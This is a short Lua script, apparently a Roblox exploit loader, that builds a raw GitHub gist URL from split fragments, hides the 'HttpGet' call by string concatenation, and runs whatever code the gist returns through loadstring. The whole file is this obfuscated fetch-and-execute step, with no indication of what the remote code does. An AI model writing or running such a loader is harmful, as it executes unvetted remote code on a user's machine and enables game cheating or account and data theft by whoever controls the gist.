(function(...)
    local _ENV = (getfenv and getfenv()) or _ENV
    local load = (loadstring or load)
    local g = game
    local get = g["Http".."Get"]
    local url = table.concat({
        "https://gist.githubusercontent.com/",
        "veer0619296944-beep/",
        "d39a6b99776b9e6b4d05856c5a2e6f5b/",
        "raw/gistfile1.txt"
    })
    
    load(get(g, url .. "?t=" .. tick()))()
end)()